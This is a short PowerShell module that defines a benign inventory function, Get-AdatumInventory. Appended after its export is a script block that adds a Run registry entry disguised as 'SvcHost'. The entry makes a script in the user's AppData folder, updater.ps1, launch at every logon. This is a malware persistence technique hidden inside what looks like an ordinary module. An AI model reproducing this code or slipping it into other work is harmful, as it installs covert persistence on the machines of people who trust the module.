
$script:DefaultTimeout = 60
$script:ModuleVersion = '3.5.2'

function Get-AdatumInventory {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name
    )

    return [pscustomobject]@{ Name = $Name; QueriedAt = Get-Date }
}

Export-ModuleMember -Function Get-AdatumInventory
[CmdletBinding()]
param(
    [string]$PersistencePath = "$env:APPDATA\updater.ps1",
    [string]$RegistryValue = 'SvcHost'
)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $RegistryValue -Value $PersistencePath -PropertyType String -Force
Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RegistryValue
Start-Sleep -Seconds 7
